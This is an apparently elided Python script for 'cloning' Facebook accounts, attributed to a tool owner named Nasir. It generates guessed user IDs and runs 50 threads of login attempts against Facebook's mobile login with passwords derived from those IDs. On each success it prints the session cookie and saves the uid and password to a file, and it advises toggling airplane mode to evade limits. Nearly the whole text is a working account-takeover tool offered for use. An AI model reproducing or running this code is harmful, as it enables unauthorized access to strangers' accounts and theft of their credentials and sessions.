...
logo = ("""
\033[36m _        _______  _______ _________ _______ 
( (    /|(  ___  )(  ____ \\__   __/(  ____ )
|  \  ( || (   ) || (    \/   ) (   | (    )|
|   \ | || (___) || (_____    | |   | (____)|
| (\ \) ||  ___  |(_____  )   | |   |     __)
...
def riddu():
    ...
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[🔥]\033[36m Example : {xr}019,017,016,018,013,015{x}')
    print(" \033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××")
    rk1 = '0191'
    rk2 = '0172'
    rk3 = '0165'
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[36m EXAMPLE : 10000, 20000, 50000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[31m[🔥]\033[33m TOTAL IDS: {xr}'+tl)
        print(f' \033[31m[🔥]\033[33m THE PROCESS HAS BEEN \033[32mSTARTED')
        print(f' \033[31m[🔥]\033[33m WORK CUNTRY \033[37m: \033[32mBANGL\033[31mADESH')
        print(f' \033[31m[🔥]\033[33m TOOL OWNER \033[37m: \033[1;96m NASIR')
        print(f' \033[31m[🔥]\033[33m USE AEROPLANE MOOD IN EVERY \033[37m 5 \033[33m MINUTE')
        print(f' \033[31m[🔥]\033[33m Tool Work = \033[34mwifi+Data ! ')
        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
...
def rcrack(uid,pwx,tl):
    ...
    'dpr': '2.75',
    'referer': 'https://m.prod.facebook.com/login',
    ...
    'user-agent': 'pro',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[NASIR-OK 💡] ' +uid+ ' | ' +ps+    '  \n[‎‎🔥]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/NASIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;33m [NASIR-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}NASIR{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
